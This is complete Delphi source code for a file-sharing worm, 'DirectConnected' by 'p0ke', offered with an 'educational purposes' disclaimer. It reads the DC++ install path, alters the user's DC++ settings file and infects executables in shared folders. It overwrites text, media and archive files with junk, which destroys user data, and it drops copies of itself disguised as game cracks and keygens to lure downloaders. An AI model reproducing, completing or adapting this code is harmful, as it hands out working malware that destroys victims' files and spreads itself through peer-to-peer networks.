   (************************)
   (* DirectConnected Worm.*)
   (*    Written by p0ke   *)
   (************************)

   {
     This code is created for educational purposes.
     If you use this code, make sure to credit where
     credit is due.
     Use this source on your own responsibility, the
     author(s)/creator(s) cannot be held responsible for any
     actions/damage taken/made by this application.
     Neither can the author(s) ips(s) or anyone
     related to the author(s) be held responsible for
     this sourcecode.

     You have been warned.

     ----

     This worm finds DC++ installpath through regedit.
     And it opens %dcpath%\DCPlusPlus.xml to find share
     dirs and to modify the description of the user.

     After it drops copies of itself (named after games
     and cracks), aswell as infects all executeables in
     the shared directories.

     Have fun with this source.

     NOTE: To lower the size of this application
           goto 'Project'->'Options'->'Directories'
           and browse the attached "System" directory
           in 'Search Path'.

           This is replacement for some of the deafult
           compile units, and will lower the application
           size.

     NOTE: You cannot use the 'System' directory if your
           application is gonna have ($APPTYPE CONSOLE) in it.
   }

   program DirectConnected;

   uses
     windows, shellapi, tlhelp32;

   {$R *.res}

   const
     faReadOnly  = $00000001;
     faHidden    = $00000002;
     faSysFile   = $00000004;
     faVolumeID  = $00000008;
     faDirectory = $00000010;
     faArchive   = $00000020;
     faAnyFile   = $0000003F;

   Type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

   var
     GlobalPath    :String;

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   // start coding.
   function GetRandName: String;
   Var
     Name: String;
   Begin
     Str(GetTickCount, Name);
     Result := Name+'.exe';
   End;

   function InttoStr(const Value: integer): string; var S: string[11];
   begin Str(Value, S); Result := S; end;

   function StrtoInt(const S: string): integer; var E: integer;
   begin Val(S, Result, E);end;

   procedure ReadFileStr(Fname:string;var FullContents:string);
   var
    Fcontents:File of Char;
    Fbuffer:array [1..1024] of Char;
    rLen,Fsize:LongInt;
   begin
   Try
    FullContents:='';

    AssignFile(Fcontents,Fname);
    Reset(Fcontents);
    Fsize:=FileSize(Fcontents);
    while not Eof(Fcontents) do begin
     BlockRead(Fcontents,Fbuffer,1024,rLen);
     FullContents:=FullContents + string(Fbuffer);
    end;
    CloseFile(Fcontents);

    if Length(FullContents) > Fsize then
     FullContents:=Copy(FullContents,1,Fsize);
   Except
     ;
   End;
   end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     If Pos('.', Filename) = 0 Then
     Begin
       Result := '';
       Exit;
     End;
     L := Length(Filename);
     for i := L downto 1 do
     begin
       Ch := Filename[i];
       if (Ch = '.') then
       begin
         Result := Copy(Filename, i + 1, Length(Filename));
         Break;
       end;
     end;
   end;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function IsRunning(ExeFileName: string): bool;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
     Len: Integer;
     name1, name2, name3: string;
   begin
     result := False;

     FSnapshotHandle := CreateToolhelp32Snapshot
                        (TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle,
                                    FProcessEntry32);

     while integer(ContinueLoop) <> 0 do
     begin
       Len := Length(FProcessEntry32.szExeFile);

       Name1 := UpperCase(ExtractFileName(FProcessEntry32.szExeFile));
       Name2 := UpperCase(Copy(ExeFileName, 1, Len));
       Name3 := UpperCase(FProcessEntry32.szExeFile);

       If (Name1 = Name2) Or (Name3 = Name2) Then
         Result := True;

       ContinueLoop := Process32Next(FSnapshotHandle,
                                     FProcessEntry32);
     end;

     CloseHandle(FSnapshotHandle);
   end;

   Procedure InfectFile(Name: String);
   Var
     FileBuffer, Settings: String;
     F: TextFile;
   Begin
     If IsRunning(ExtractFileName(Name)) Then Exit;
     If Name = ParamStr(0) Then Exit;

     FileBuffer := '';
     ReadFileStr(Name, FileBuffer);
     If FileBuffer = '' Then Exit;

     If Pos('|dc|directconnect1.0|', FileBuffer) > 0 Then Exit;
     If Not CopyFile(pChar(ParamStr(0)), pChar(Name), False) Then Exit;

     Settings := #00 + GetRandName + #02 + IntToStr(Length(FileBuffer)) + #01;

     AssignFile(F, Name);
     Append(F);
     Write(F, FileBuffer);
     Write(F, Settings);
     CloseFile(F);
   End;

   Procedure ReleaseIt;
   Var
     FContent, Settings, FName, FSet, PName: String;
     I, FSize: Integer;
     F: TextFile;
   Begin
     PName := GetRandName;
     If Not CopyFile(pChar(ParamStr(0)), pChar(PName), False) Then Exit;
     ReadFileStr(PName, FContent);

     I := Length(FContent);
     Settings := '';

     While (I > 0) And (FContent[i] <> #00) Do
     Begin
       Settings := FContent[i] + Settings;
       Dec(I);
     End;

     If Settings = '' Then
     Begin
       DeleteFile(pChar(PName));
       Exit;
     End;
     Delete(FContent, I, Length(Settings));

     While Pos(#01, Settings) > 0 Do
     Begin
       FSet := Copy(Settings, 1, Pos(#01, Settings)-1);
       Delete(Settings, 1, Pos(#01, Settings));

       FName := Copy(FSet, 1, Pos(#02, FSet)-1);
       Delete(FSet, 1, Pos(#02, FSet));
       FSize := StrToInt(FSet);

       Try
         AssignFile(F, FName);
         ReWrite(F);
         Write(F, Copy(FContent, Length(FContent)-FSize, FSize));
         CloseFile(F);
       Except
         Exit;
       End;

       Delete(FContent, Length(FContent)-FSize, FSize);
       ShellExecute(0, NIL, pChar(FName), NIL, NIL, 1);
     End;
     DeleteFile(pChar(PName));
   End;

   Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   Var
    Key : Hkey;
    Siz : Cardinal;
    Val : Array[0..16382] Of Char;
   Begin
    ZeroMemory(@Val, Length(Val));
    RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
    Siz := 16383;
    RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(Key);
    If Val<> '' then
     Result := Val;
   End;

   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   Procedure GetDCPath;
   Var
     Path: String;
   Begin
     Path := 'nopath';
     Path := GetRegValue(HKEY_LOCAL_MACHINE, 'Software\DC++', 'Install_Dir');
     If (Path = 'nopath') Then ExitProcess(0);

     GlobalPath := Path;
   End;

   Procedure BreakFile(Name: String);
   Var
     Temp  :String;
     F     :TextFile;
     I     :Integer;
   Begin
     Randomize;
     If IsRunning(ExtractFileName(Name)) Then Exit;
     If Name = ParamStr(0) Then Exit;
     ReadFileStr(Name, Temp);

     AssignFile(F, Name);
     ReWrite(F);
     For I := 1 To Length(Temp) Do
       Write(F, IntToStr(Random(257)));
     CloseFile(F);
   End;

   Procedure LeaveText(Name: String);
   Var
     F     :TextFile;
   Begin
     If IsRunning(ExtractFileName(Name)) Then Exit;
     If Name = ParamStr(0) Then Exit;

     AssignFile(F, Name);
     Rewrite(f);

     WriteLn(F, '--- DC|DirectConnect1.0| ---');
     WriteLn(F, '---     Coded By p0ke    ---');

     CloseFile(F);
   End;

   Procedure InfectDirectory(Dir: String);
   Var
     Sr: TSearchRec;
   Begin
     If Dir[Length(Dir)] <> '\' Then Dir := Dir + '\';
     If FindFirst(Dir+'*.*', faDirectory, SR) = 0 Then
     Repeat
       If ((SR.Attr And faDirectory) = faDirectory) And (SR.Name[1] <> '.') Then
         InfectDirectory(Dir+SR.Name)
       Else
       Begin
         If (Sr.Name[1] <> '.') Then
         Begin
           If (UpperCase(ExtractFileExt(Sr.Name)) = 'TXT') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'NFO') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'DOC') Then
                LeaveText(Dir+Sr.Name);
           If (UpperCase(ExtractFileExt(Sr.Name)) = 'MP3') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'ISO') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'BIN') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'MPG') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'AVI') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'MPEG') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'RAR') Then
                BreakFile(Dir+Sr.Name);
           If (UpperCase(ExtractFileExt(Sr.Name)) = 'EXE') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'PIF') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'COM') or
              (UpperCase(ExtractFileExt(Sr.Name)) = 'SCR') Then
                InfectFile(Dir+Sr.Name);
         End;
       End;
     Until (FindNext(Sr) <> 0);
     FindClose(Sr);
   End;

   Procedure DropFakes(Dir: String);
   Const
     Names: Array [0..9] Of String = ('crack', 'nocd', 'no-cd', 'trainer', 'keygen',
                                      'hack', 'serial', 'key-gen', 'key gen', 'patch');
     Games: Array [0..9] Of String = ('counter-strike', 'battlefield 1942', 'battlefield vietnamn', 'quake3', 'osbcure',
                                      'morrowind', 'morrowind (oblivion)', 'oblivion', 'dark age of camelot', 'call of duty');
   Var
     TempName: String;
     Count   : Integer;
   Begin
     randomize;

     If ((Random(100)+1) > 50) Then
     Begin
       CreateDirectory(pChar(Dir+'Cracks, NoCd-s, Trainers, Keygens, Hacks, Serial, Patches'), NIL);
       Dir := Dir + 'Cracks, NoCd-s, Trainers, Keygens, Hacks, Serial, Patches';
     End;

     Count := Random(19)+1;
     Repeat

       TempName := Games[Random(9)];
       Case Random(4) Of
         0: TempName := TempName + ' ' + Names[Random(9)];
         1: TempName := TempName + '-' + Names[Random(9)];
         2: TempName := TempName + '(' + Names[Random(9)]+')';
         3: TempName := TempName + '+' + Names[Random(9)];
       End;

       CopyFile(pChar(ParamStr(0)), pChar(Dir + TempName), False);
       Dec(Count);
     Until Count = 0;
   End;

   Procedure InfectDC;
   Var
     SettingsFile  :String;
     TempFile      :TextFile;
     TempStr       :String;
     Temp          :String;
     P             :Integer;
     I             :Integer;

     DownloadDir   :String;
     ShareDir      :Array of String;
     ShareCount    :Integer;
   Begin
     ShareCount := 0;
     SetLength(ShareDir, ShareCount);
     DownloadDir := '';

     SettingsFile := GlobalPath+'\DCPlusPlus.xml';
     If FileExists(SettingsFile) Then
     Begin

       ReadFileStr(SettingsFile, TempStr);
       AssignFile(TempFile, SettingsFile);
       Rewrite(TempFile);

       P := Pos('<Description type="string">', TempStr);
       Temp := Copy(TempStr, 1, P-1);
       Write(TempFile, Temp);
       Temp := '<Description type="string">Direct Connected 1.0 by p0ke';
       Write(TempFile, Temp);
       P := Pos('</Description>', TempStr);
       Temp := Copy(TempStr, P, length(TempStr));
       Write(TempFile, Temp);

       CloseFile(TempFile);

       If (TempStr <> '') Then
       Begin
         P := Pos('<DownloadDirectory type="string">', tempStr);
         P := P + Length('<DownloadDirectory type="string">');
         DownloadDir := Copy(TempStr, P, Length(TempStr));
         DownloadDir := Copy(DownloadDir, 1, Pos('<', DownloadDir)-1);

         Delete(TempStr, 1, Pos('<Share>', TempStr));
         While Pos('<Directory>', TempStr) > 0 Do
         Begin
           Delete(TempStr, 1, Pos('<Directory>', TempStr)+10);
           Inc(ShareCount);
           SetLength(ShareDir, ShareCount);
           Temp := Copy(TempStr, 1, Pos('</', TempStr)-1);
           ShareDir[ShareCount-1] := Temp;
           Delete(TempStr, 1, Pos('</Directory>', TempStr));
         End;

         For I := 0 To ShareCount-1 Do
         Begin
           If ShareDir[i][Length(ShareDir[i])] <> '\' Then
             ShareDir[i] := ShareDir[i] + '\';
           InfectDirectory(ShareDir[I]);
           DropFakes      (ShareDir[I]);
         End;
       End;
     End;
   End;

   begin
     ReleaseIt;
     GetDCPath;
     InfectDC;
   end.
